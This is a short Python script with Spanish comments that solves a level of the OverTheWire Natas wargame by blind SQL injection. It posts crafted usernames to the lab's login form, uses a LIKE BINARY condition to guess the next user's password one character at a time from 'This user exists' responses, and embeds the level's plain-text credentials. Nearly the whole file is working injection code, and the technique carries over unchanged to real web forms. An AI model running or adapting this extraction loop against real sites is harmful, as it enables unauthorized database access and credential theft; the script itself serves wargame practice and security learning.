import requests

url = 'http://natas15.natas.labs.overthewire.org'
#Credenciales del usuario de la página web
auth = ('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
#Todas las letras y números para averiguar cuales contiene el password
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#Aqui guardaremos cada caracter encontrado del password del natas16
password = ''

# Hacemos un ciclo que itere hasta que se encuentre el password
while True:
    # Iteramos por cada uno de los caracteres que estan en el conjunto "charset"
    for char in charset:
        # Este es la consulta SQL inyección, en donde verificaremos que cada caracter concatenado-> 
        # pertenezaca al password del username "natas16"
        payload = {'username': f'natas16" AND password LIKE BINARY "{password}{char}%" -- '}
        # Realizamos la petición post ya que es la que esta en el formulario, pasandole la inyección sql
        response = requests.post(url, auth=auth, data=payload)

        # Si se ejecuta la consulta sql, eso quiere decir que el caracter concatenado
        # o el string que se va formando, es parte del password, por lo tanto la pagina
        # nos arrojaria: "This user exists", entonces unimos ese "char" a "password"
        if 'This user exists' in response.text:
            password += char #vamos uniendo y formando cada caracter que pertenece al password
            print(f'Password so far: {password}')
            #Cuando se encuentra un caracter, rompemos el ciclo for para que empiece otra vez 
            # y encuentre la siguiente letra
            break 

    #Cuando el for itero por todo el conjunto, eso quiere decir que el password ya esta completo.
    # Entonces pasa a este else, se imprime el pass y se rome el ciclo while
    else:
        print(f'Password found: {password}')
        break 

